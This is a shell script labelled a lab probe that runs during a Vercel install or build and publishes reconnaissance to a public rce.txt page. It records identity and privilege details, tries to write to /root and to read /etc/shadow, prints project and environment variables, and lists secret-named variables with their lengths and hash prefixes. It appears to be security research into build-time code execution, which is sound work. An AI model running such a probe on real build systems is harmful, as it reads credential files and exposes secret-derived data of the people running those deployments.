#!/bin/sh
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
# Lab probe: runs during install/build, publishes evidence. Secret values are hashed, not printed.
{
  echo "== who am i =="
  id
  uname -a
  echo "== real root or emulated =="
  echo "FAKEROOTKEY=${FAKEROOTKEY:-ABSENT}"
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo -n "write to /root: "; (touch /root/.lab-write-test && echo OK) || echo DENIED
  echo -n "read /etc/shadow: "; (head -c 1 /etc/shadow >/dev/null 2>&1 && echo READABLE) || echo DENIED
  echo "== nonce =="
  echo "LAB-NONCE: CANARY-8336db7bc74b6183"
  echo "== plaintext canaries (deliberate, throwaway) =="
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "VERCEL_PROJECT_ID=${VERCEL_PROJECT_ID:-unset}"
  echo "LAB_CANARY_A=${LAB_CANARY_A:-unset}"
  echo "LAB_CANARY_B=${LAB_CANARY_B:-unset}"
  echo "LAB_CANARY_C=${LAB_CANARY_C:-unset}"
  echo "== secret-looking values: length + sha256 prefix (raw not published) =="
  env | sort | while IFS='=' read -r k v; do
    case "$k" in
      *_TOKEN*|*_KEY*|*_SECRET*|*AUTH*|*PASS*|*CRED*|*ENCRYPTED*)
        h=$(printf '%s' "$v" | sha256sum | cut -c1-16)
        echo "$k len=${#v} sha256=$h"
        ;;
    esac
  done
  echo "== total exported vars =="
  env | wc -l
} > public/rce.txt
